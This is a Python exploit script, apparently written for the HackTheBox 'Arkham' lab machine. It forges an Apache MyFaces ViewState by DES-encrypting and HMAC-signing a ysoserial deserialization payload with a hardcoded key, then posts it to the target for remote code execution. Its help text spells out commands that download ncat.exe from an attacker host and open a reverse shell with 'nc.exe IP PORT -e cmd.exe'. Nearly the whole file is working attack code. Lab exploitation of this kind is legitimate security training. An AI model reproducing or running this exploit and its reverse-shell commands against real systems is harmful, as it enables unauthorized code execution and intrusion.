#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
#
#  hackthebox_tool
#  Copyright (C) 2019  kmahyyg
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Affero General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Affero General Public License for more details.
#
#  You should have received a copy of the GNU Affero General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.

# http://myfaces.apache.org/core22/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html

from Crypto.Cipher import DES as DESCipher
from Crypto.Hash import SHA1 as SHA1Sum
from Crypto.Hash import HMAC as HMACCipher
import base64
import sys
import requests

# Utility function

def print_help():
    print("\n")
    print('''
    Download ysoserial from https://github.com/pimps/ysoserial-modified , Then:

    java -jar ./ysoserial-modified.jar CommonsCollections5 powershell 'Invoke-WebRequest http://IP:PORT/ncat.exe -OutFile nc.exe' > output_serialized_download_nc.bin
    java -jar ./ysoserial-modified.jar CommonsCollections5 cmd 'nc.exe IP PORT -e cmd.exe' > output_serialized_revshell.bin

    After that, put this script in the same folder with payload , then run this script like this:

    python3 ./arkham-encrypt_payload.py output_serialized_revshell.bin

    It will tells you result.
    ''')

def pad(plain_bytes):
    """
    func to pad cleartext to be multiples of 8-byte blocks.
    If you want to encrypt a text message that is not multiples of 8-byte blocks,
    the text message must be padded with additional bytes to make the text message to be multiples of 8-byte blocks.
    """
    number_of_bytes_to_pad = INIT_BS - len(plain_bytes) % INIT_BS
    ascii_string = chr(number_of_bytes_to_pad).encode()
    padding_byte = number_of_bytes_to_pad * ascii_string
    padded_plain_text =  plain_bytes + padding_byte
    return padded_plain_text

# Check user input validity

try:
    if not isinstance(sys.argv[0],str):
        print("Payload not exist.")
        print_help()
        sys.exit(1)
except:
    print("Payload not exist.")
    print_help()
    sys.exit(1)


PAYLOAD_BINARY = sys.argv[0]

# Constant Variable according to Config

INIT_SECRET = base64.b64decode(b"SnNGOTg3Ni0=")
INIT_MODE = DESCipher.MODE_ECB
INIT_BS = DESCipher.block_size
MAC_SECRET = base64.b64decode(b"SnNGOTg3Ni0=")
MYFACES_CHARSET = "iso-8859-1"

# Load the payload in

bindata = open(PAYLOAD_BINARY, 'rb').read()

# Encrypt using DES-ECB-PKCS5

engine1 = DESCipher.new(INIT_SECRET, INIT_MODE)
pt1 = pad(bindata)
enc1 = engine1.encrypt(pt1)

# Sign with HMAC-SHA1

engine2 = HMACCipher.new(MAC_SECRET, enc1, SHA1Sum)
enc2 = engine2.digest()

# Final Result

finalr1 = base64.b64encode(enc1 + enc2)

# HTTP POST Request - Data preparation

postdt = {
    "j_id_jsp_1623871077_1:email":"test1@test2.com",
    "j_id_jsp_1623871077_1:submit":"SIGN UP",
    "j_id_jsp_1623871077_1_SUBMIT":"1",
    "javax.faces.ViewState": finalr1.decode()
}

# HTTP POST Request - Send out

r = requests.post("http://10.10.10.130:8080/userSubscribe.faces", data=postdt)
print("HTTP Status Code: " + str(r.status_code))
print("Please check your webserver log or netcat to check result.")
